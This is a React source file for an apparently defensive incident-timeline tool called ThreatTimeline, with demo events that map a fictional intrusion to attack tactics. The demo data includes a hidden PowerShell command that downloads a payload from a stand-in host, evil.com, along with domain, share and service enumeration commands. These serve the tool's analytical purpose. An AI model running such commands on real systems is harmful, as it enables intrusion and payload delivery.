import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import Timeline, { TimelineRef } from "@/components/Timeline";
import Visualization from "@/components/Visualization";
import ArtifactsPage from "./artifacts";
import { useState, useRef } from "react";
import { v4 as uuidv4 } from "uuid";
import { useToast } from "@/components/ui/use-toast";
import { Button } from "@/components/ui/button";
import { Eye, Edit2, Database, RotateCcw, Download, Clock, NetworkIcon } from "lucide-react";
import { useEvents } from "@/lib/events";
import type { XYPosition } from "reactflow";
import { ReportButton } from "@/components/ReportButton";

export interface NetworkDetails {
  proxyIp?: string;
  port?: string;
  destinationIp?: string;
}

export interface TimelineEvent {
  id: string;
  timestamp: string;
  title: string;
  description: string;
  tactic?: string;
  technique?: string;
  parentId?: string;
  artifacts: Artifact[];
  order?: number;
  // Additional fields for event details
  searchQuery?: string;
  rawLog?: string;
  attachedFile?: string;
  // Legacy fields (to maintain compatibility)
  host?: string;
  user?: string;
  process?: string;
  sha256?: string;
  networkDetails?: NetworkDetails;
  lateralMovementSource?: string;
  lateralMovementTarget?: string;
  // UI state
  initialView?: 'details' | 'search' | 'log';
}

export interface Artifact {
  type: 'hostname' | 'domain' | 'file' | 'ip' | 'hash' | 'custom' | 'email' | 'command' | 'user';
  name: string;
  value: string;
  linkedValue?: string;
}

export const demoEvents: TimelineEvent[] = [
  {
    id: "1",
    timestamp: "2024-03-14T10:00",
    title: "Initial Access - Phishing Email",
    description: "User clicked on malicious link in phishing email",
    tactic: "Initial Access",
    technique: "Phishing",
    artifacts: [
      { type: "email", name: "From", value: "attacker@malicious.com" },
      { type: "domain", name: "URL", value: "fake-login.evil.com" }
    ],
    searchQuery: 'index=email recipient="victim@company.com" subject="Urgent Invoice Payment"',
    rawLog: 'Mar 14 10:00:15 mail-server smtp[12345]: To=victim@company.com From=attacker@malicious.com Subject="Urgent Invoice Payment"'
  },
  {
    id: "2",
    timestamp: "2024-03-14T10:05",
    title: "Execution - PowerShell Download",
    description: "PowerShell used to download malicious payload",
    tactic: "Execution",
    technique: "PowerShell",
    parentId: "1",
    artifacts: [
      { type: "file", name: "Script", value: "invoice.ps1" },
      { type: "hash", name: "SHA256", value: "a1b2c3d4e5f6..." }
    ],
    searchQuery: 'index=windows source="WinEventLog:Microsoft-Windows-PowerShell/Operational" CommandLine="*Invoke-WebRequest*"',
    rawLog: 'PowerShell.exe -NoP -NonI -W Hidden -Command "Invoke-WebRequest -Uri http://evil.com/payload -OutFile invoice.ps1"'
  },
  {
    id: "3",
    timestamp: "2024-03-14T10:07",
    title: "Discovery - Network Share Enumeration",
    description: "Malware enumerating network shares",
    tactic: "Discovery",
    technique: "Network Share Discovery",
    parentId: "2",
    artifacts: [
      { type: "hostname", name: "Source", value: "WORKSTATION1" },
      { type: "command", name: "Executed", value: "net view /all" }
    ],
    searchQuery: 'index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 CommandLine="*net view*"',
    rawLog: 'Process Create: net.exe CommandLine: net view /all'
  },
  {
    id: "4",
    timestamp: "2024-03-14T10:08",
    title: "Discovery - User Enumeration",
    description: "Malware enumerating domain users",
    tactic: "Discovery",
    technique: "Account Discovery",
    parentId: "2",
    artifacts: [
      { type: "hostname", name: "Source", value: "WORKSTATION1" },
      { type: "command", name: "Executed", value: "net user /domain" }
    ],
    searchQuery: 'index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 CommandLine="*net user*"',
    rawLog: 'Process Create: net.exe CommandLine: net user /domain'
  },
  {
    id: "5",
    timestamp: "2024-03-14T10:10",
    title: "Discovery - Service Enumeration",
    description: "Malware enumerating running services",
    tactic: "Discovery",
    technique: "System Service Discovery",
    parentId: "2",
    artifacts: [
      { type: "hostname", name: "Source", value: "WORKSTATION1" },
      { type: "command", name: "Executed", value: "sc query" }
    ],
    searchQuery: 'index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*sc.exe"',
    rawLog: 'Process Create: sc.exe CommandLine: sc query state= all'
  },
  {
    id: "6",
    timestamp: "2024-03-14T10:15",
    title: "Persistence - Scheduled Task",
    description: "Malware established persistence via scheduled task",
    tactic: "Persistence",
    technique: "Scheduled Task",
    parentId: "2",
    artifacts: [
      { type: "file", name: "Task Name", value: "SystemUpdate" },
      { type: "file", name: "Path", value: "C:\\Windows\\Tasks\\update.job" }
    ],
    searchQuery: 'index=windows EventCode=4698 TaskName="SystemUpdate"',
    rawLog: 'A scheduled task was created. Task Name: SystemUpdate, Command: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
  },
  {
    id: "8",
    timestamp: "2024-03-14T10:25",
    title: "Initial Access on SERVER2",
    description: "Initial foothold established via RDP",
    tactic: "Initial Access",
    technique: "Valid Accounts",
    // No parentId - this is a new root event on SERVER2
    artifacts: [
      { type: "hostname", name: "Host", value: "SERVER2" },
      { type: "user", name: "Account", value: "Administrator" }
    ],
    searchQuery: 'index=windows host=SERVER2 EventCode=4624 LogonType=10',
    rawLog: 'An account was successfully logged on. Host: SERVER2, Account: Administrator, LogonType: 10'
  },
  {
    id: "7",
    timestamp: "2024-03-14T10:20",
    title: "Lateral Movement - Remote Desktop",
    description: "Lateral movement observed to another system",
    tactic: "Lateral Movement",
    technique: "Remote Desktop Protocol",
    parentId: "2",
    artifacts: [
      { type: "hostname", name: "Source", value: "WORKSTATION1" },
      { type: "hostname", name: "Target", value: "SERVER2" }
    ],
    searchQuery: 'index=windows EventCode=4624 LogonType=10 ComputerName=SERVER2',
    rawLog: 'An account was successfully logged on. Subject: Account Name: Administrator Logon Type: 10 Source Workstation: WORKSTATION1',
    lateralMovementSource: "2",
    lateralMovementTarget: "8"  // Point to the Initial Access event
  }
];

export default function Index() {
  const [activeTab, setActiveTab] = useState("timeline");
  const [isEditMode, setIsEditMode] = useState(false);
  const timelineRef = useRef<TimelineRef>(null);
  const { events, setEvents, loadDemoData } = useEvents();
  const { toast } = useToast();
  const [nodePositions, setNodePositions] = useState<Record<string, XYPosition>>({});
  const visualizationRef = useRef<{ exportAsPng: () => Promise<void> }>(null);

  const handleAddEvent = (parentId?: string) => {
    try {
      console.log('Adding new event with parentId:', parentId);
      const newEvent: TimelineEvent = {
        id: uuidv4(),
        timestamp: new Date().toISOString().slice(0, 16),
        title: "",
        description: "",
        artifacts: [],
        parentId: typeof parentId === 'string' ? parentId : undefined,
      };
      
      console.log('New event object:', newEvent);
      setEvents(prevEvents => [...prevEvents, newEvent]);
      
      // Return the new event ID so we can track it
      return newEvent.id;
    } catch (error) {
      console.error('Error adding event:', error);
      toast({
        title: "Error",
        description: "Failed to add event",
        variant: "destructive",
      });
      return null;
    }
  };

  const handleSelectEvent = (event: TimelineEvent) => {
    console.log('Selected event:', event);
    toast({
      title: "Event Selected",
      description: `Selected: ${event.title || 'Untitled Event'}`,
    });
  };

  const handleUpdateEvent = (updatedEvent: TimelineEvent) => {
    try {
      console.log('Updating event:', updatedEvent);
      
      setEvents(prevEvents => {
        // Create a deep copy of the current events
        const currentEvents = JSON.parse(JSON.stringify(prevEvents));
        console.log('Current events:', currentEvents);
        
        // Find and update the event
        const updatedEvents = currentEvents.map(event => {
          if (event.id === updatedEvent.id) {
            // Create deep copies to ensure we're working with fresh objects
            const existingEvent = JSON.parse(JSON.stringify(event));
            const newEvent = JSON.parse(JSON.stringify(updatedEvent));
            
            // Merge while preserving all fields
            const mergedEvent = {
              ...existingEvent,  // Start with all existing fields
              ...newEvent,       // Override with new fields
              // Explicitly preserve arrays and objects
              artifacts: newEvent.artifacts || existingEvent.artifacts || [],
              networkDetails: newEvent.networkDetails || existingEvent.networkDetails,
              // Preserve these fields if they exist in either object
              searchQuery: newEvent.searchQuery || existingEvent.searchQuery,
              rawLog: newEvent.rawLog || existingEvent.rawLog,
              attachedFile: newEvent.attachedFile || existingEvent.attachedFile,
              host: newEvent.host || existingEvent.host,
              user: newEvent.user || existingEvent.user,
              process: newEvent.process || existingEvent.process,
              sha256: newEvent.sha256 || existingEvent.sha256,
              lateralMovementSource: newEvent.lateralMovementSource || existingEvent.lateralMovementSource,
              lateralMovementTarget: newEvent.lateralMovementTarget || existingEvent.lateralMovementTarget,
            };
            
            console.log('Merged event:', mergedEvent);
            return mergedEvent;
          }
          return event;
        });
        
        console.log('Updated events:', updatedEvents);
        return updatedEvents;
      });
      
      toast({
        title: "Event Updated",
        description: "Changes have been saved successfully.",
      });
    } catch (error) {
      console.error('Error in handleUpdateEvent:', error);
      toast({
        title: "Error",
        description: "Failed to update event. Please try again.",
        variant: "destructive",
      });
    }
  };

  const handleDeleteEvent = (eventId: string) => {
    try {
      console.log('Deleting event:', eventId);
      setEvents(prevEvents => {
        try {
          const currentEvents = Array.isArray(prevEvents) ? prevEvents : [];
          console.log('Previous events before delete:', currentEvents);
          
          // Get all descendant event IDs recursively
          const getDescendantIds = (parentId: string): string[] => {
            const children = currentEvents.filter(event => event.parentId === parentId);
            return [
              ...children.map(child => child.id),
              ...children.flatMap(child => getDescendantIds(child.id))
            ];
          };
          
          // Get all IDs to delete (the event itself and all its descendants)
          const idsToDelete = [eventId, ...getDescendantIds(eventId)];
          console.log('Deleting events with IDs:', idsToDelete);
          
          // Filter out all events that should be deleted
          const filteredEvents = currentEvents.filter(event => !idsToDelete.includes(event.id));
          console.log('Events after delete:', filteredEvents);
          return filteredEvents;
        } catch (error) {
          console.error('Error filtering events:', error);
          return prevEvents;
        }
      });
    } catch (error) {
      console.error('Error in handleDeleteEvent:', error);
      toast({
        title: "Error",
        description: "Failed to delete event",
        variant: "destructive",
      });
    }
  };

  const handleLateralMovement = (sourceEvent: TimelineEvent, destinationHost: string) => {
    console.log('Creating lateral movement from:', sourceEvent, 'to:', destinationHost);
    
    // Parse destination host string to extract hostname and IP
    let destHostname: string | undefined;
    let destIP: string | undefined;
    
    // Check if the destination contains both hostname and IP
    const ipMatch = destinationHost.match(/^(.*?)\s*\((.*?)\)$/);
    if (ipMatch) {
      destHostname = ipMatch[1];
      destIP = ipMatch[2];
    } else {
      // If no parentheses, the value could be either hostname or IP
      destHostname = destinationHost;
    }
    
    // Create the initial access event first
    const initialAccessEvent: TimelineEvent = {
      id: uuidv4(),
      timestamp: new Date().toISOString().slice(0, 16),
      title: `Initial Access on ${destHostname || destIP}`,
      description: ``,
      tactic: "Initial Access",
      technique: "Valid Accounts",
      artifacts: [
        {
          type: "hostname" as const,
          name: "Source Host",
          value: destHostname || destIP || '',
          linkedValue: destIP && destHostname ? destIP : undefined
        }
      ],
      host: destHostname || destIP
    };

    // Update the source event with lateral movement information
    const updatedSourceEvent: TimelineEvent = {
      ...sourceEvent,
      artifacts: [
        ...sourceEvent.artifacts.filter(a => !['Source Host', 'Destination Host'].includes(a.name)),
        sourceEvent.artifacts.find(a => a.name === 'Source Host') || {
          type: "hostname" as const,
          name: "Source Host",
          value: sourceEvent.host || '',
        },
        {
          type: "hostname" as const,
          name: "Destination Host",
          value: destHostname || destIP || '',
          linkedValue: destIP && destHostname ? destIP : undefined
        }
      ],
      lateralMovementTarget: initialAccessEvent.id
    };
    
    console.log('Updated source event:', updatedSourceEvent);
    console.log('New initial access event:', initialAccessEvent);
    
    setEvents(prevEvents => {
      console.log('Previous events:', prevEvents);
      // Update the source event and add the initial access event
      const newEvents = prevEvents.map(event => 
        event.id === sourceEvent.id ? updatedSourceEvent : event
      );
      newEvents.push(initialAccessEvent);
      console.log('Updated events with lateral movement:', newEvents);
      return newEvents;
    });
    
    toast({
      title: "Lateral Movement Created",
      description: `Added lateral movement to ${destinationHost}`,
    });
  };

  const handleResetLayout = () => {
    setNodePositions({});
    toast({
      title: "Layout Reset",
      description: "Node positions have been reset to their original layout.",
    });
  };

  const handleExport = () => {
    visualizationRef.current?.exportAsPng();
  };

  return (
    <main className="container mx-auto py-4">
      <div className="flex justify-between items-center mb-4">
        <h1 className="text-2xl font-bold">ThreatTimeline</h1>
      </div>

      <Tabs value={activeTab} onValueChange={setActiveTab}>
        <div className="flex justify-between items-center">
          <TabsList>
            <TabsTrigger value="timeline">
              <Clock className="w-4 h-4 mr-2" />
              Timeline
            </TabsTrigger>
            <TabsTrigger value="visualization">
              <NetworkIcon className="w-4 h-4 mr-2" />
              Visualization
            </TabsTrigger>
            <TabsTrigger value="artifacts">
              <Database className="w-4 h-4 mr-2" />
              Artifacts & IOCs
            </TabsTrigger>
          </TabsList>
        </div>

        <TabsContent value="timeline" className="mt-4">
          <Timeline
            ref={timelineRef}
            events={events}
            onAddEvent={handleAddEvent}
            onSelectEvent={handleSelectEvent}
            onUpdateEvent={handleUpdateEvent}
            onDeleteEvent={handleDeleteEvent}
            onLateralMovement={handleLateralMovement}
            isEditMode={isEditMode}
            onEditModeToggle={() => setIsEditMode(!isEditMode)}
            onLoadDemo={loadDemoData}
          />
        </TabsContent>

        <TabsContent value="visualization" className="mt-4">
          <Visualization
            events={events}
            savedPositions={nodePositions}
            onPositionsChange={setNodePositions}
            onResetRequest={handleResetLayout}
          />
        </TabsContent>

        <TabsContent value="artifacts" className="mt-4">
          <ArtifactsPage
            timelineRef={timelineRef}
            onTabChange={setActiveTab}
          />
        </TabsContent>
      </Tabs>
    </main>
  );
}
